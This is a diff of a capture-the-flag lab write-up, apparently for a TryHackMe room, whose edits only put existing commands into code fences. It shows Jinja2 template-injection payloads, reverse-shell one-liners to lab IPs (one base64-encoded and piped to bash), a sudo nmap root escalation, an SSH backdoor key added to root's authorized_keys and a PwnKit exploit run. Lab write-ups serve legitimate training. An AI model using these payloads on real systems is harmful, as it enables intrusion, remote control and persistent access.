@@ -64,14 +64,14 @@ WORKS!!  We get  'uid=1001(minos) gid=1001(minos) groups=1001(minos)'
 ---
 
 
-{{request.application.__globals__.__builtins__.__import__('os').popen('bash+-c+"bash+-i+>%26+/dev/tcp/10.64.131.111/9001+0>%261"').read()}}
+```{{request.application.__globals__.__builtins__.__import__('os').popen('bash+-c+"bash+-i+>%26+/dev/tcp/10.64.131.111/9001+0>%261"').read()}}```
 
 NO GOOD! Hmmm
 
 THIS WORKS THOUGH!!
 
 
-{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+```{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}```
 
 <img width="1467" height="646" alt="passwd" src="https://github.com/user-attachments/assets/8b2990c2-d680-4539-aa2c-507a963e1be4" />
 
@@ -87,7 +87,7 @@ THM{499a89a2a064426921732e7d31bc08a}
 ---
 
 
-GET /?key={{request.application.__globals__.__builtins__.__import__('os').popen('ls${IFS}-al${IFS}/home/minos/').read()}} HTTP/1.1
+```GET /?key={{request.application.__globals__.__builtins__.__import__('os').popen('ls${IFS}-al${IFS}/home/minos/').read()}} HTTP/1.1```
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -128,12 +128,12 @@ password:  		Knossos
 Start a listener on 9001
 
 
-echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.146.127 9001 >/tmp/f' | base64
+```echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.146.127 9001 >/tmp/f' | base64```
 
 cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMTQ2LjEyNyA5MDAxID4vdG1wL2YK
 
 
-/?key={{request.application.__globals__.__builtins__.__import__(%27os%27).popen('echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMTQ2LjEyNyA5MDAxID4vdG1wL2YK%20|%20base64%20-d%20|%20bash').read()}}
+```/?key={{request.application.__globals__.__builtins__.__import__(%27os%27).popen('echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMTQ2LjEyNyA5MDAxID4vdG1wL2YK%20|%20base64%20-d%20|%20bash').read()}}```
 
 <img width="944" height="282" alt="revshell" src="https://github.com/user-attachments/assets/136b87d8-6c82-4c1a-9097-19eec4fe0d06" />
 
@@ -177,11 +177,11 @@ User minos may run the following commands on Minos:
 <img width="937" height="757" alt="gtfobins" src="https://github.com/user-attachments/assets/3828ce83-a87f-4d6a-88fb-63e3985eb67e" />
 
 
-`
+```
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' > $TF
 sudo nmap --script=$TF
-`
+```
 
 ##  BOOM!  We are root
 
@@ -203,19 +203,19 @@ Weird, my pwncat shell gets messed up when I got root!?
 ##  This is kind of clunky. Let's generate an ssh key, put it in /root/.ssh/authorized_keys and then just jump on the box directly.
 
 
-#   ssh-keygen -t ed25519 -f ~/theseus_key -q -N ""
+```ssh-keygen -t ed25519 -f ~/theseus_key -q -N ""```
 
 
 In the /root/.ssh directory
 
-echo '<key value>' >> authorized_keys
+```echo '<key value>' >> authorized_keys```
 
 
 Exit our poor, suffering pwncat shell and...
 
 <img width="772" height="577" alt="ssh" src="https://github.com/user-attachments/assets/a6a0ad1c-4cdf-453c-b2aa-a6920d6a64ad" />
 
-`ssh -i theseus_key root@10.64.159.130`
+```ssh -i theseus_key root@10.64.159.130```
 
 ---
 
@@ -234,7 +234,7 @@ Minos.lxd 					(10.71.235.7)
 ##  We have those creds from above. Maybe we can just ssh into Athens.lxd or Labyrinth.lxd??
 
 
-`ssh entrance@10.71.235.159`
+```ssh entrance@10.71.235.159```
 
 password:  Knossos
 
@@ -259,11 +259,11 @@ password:  Knossos
 
 #  Whoa, that's a pretty obvious privesc
 
-entrance@Labyrinth:~$ python3 CVE-2021-4034.py 
+```entrance@Labyrinth:~$ python3 CVE-2021-4034.py 
 [+] Creating shared library for exploit code.
 [+] Calling execve()
 # whoami
-root
+root```
 
 ## THAT WAS EASY!!
 
@@ -311,32 +311,32 @@ Password: TheLover
 Find the offset to the jpeg marker:
 
 
-grep -oba $'\xFF\xDB' ariadne | head 
+```grep -oba $'\xFF\xDB' ariadne | head 
 
 20:�� 
-89:��
+89:��```
 
 
 Which means:
 
-Offset 20: FF DB
-Offset 89: FF DB
+```Offset 20: FF DB
+Offset 89: FF DB```
 
 
 #  So, we need to extract everything (meaning the jpeg body) strarting from offset 20 and make a .bin file. Then, create a .bin header file. And then, combine the two files. 
 
 
-dd if=ariadne of=jpeg_body.bin bs=1 skip=20
+```dd if=ariadne of=jpeg_body.bin bs=1 skip=20
 
 29700+0 records in 
 29700+0 records out 
-29700 bytes (30 kB, 29 KiB) copied, 0.0637139 s, 466 kB/s
+29700 bytes (30 kB, 29 KiB) copied, 0.0637139 s, 466 kB/s```
 
 
-printf "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" > jpeg_header.bin
+```printf "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" > jpeg_header.bin```
 
 
-cat jpeg_header.bin jpeg_body.bin > final.jpg
+```cat jpeg_header.bin jpeg_body.bin > final.jpg```
 
 
 ---
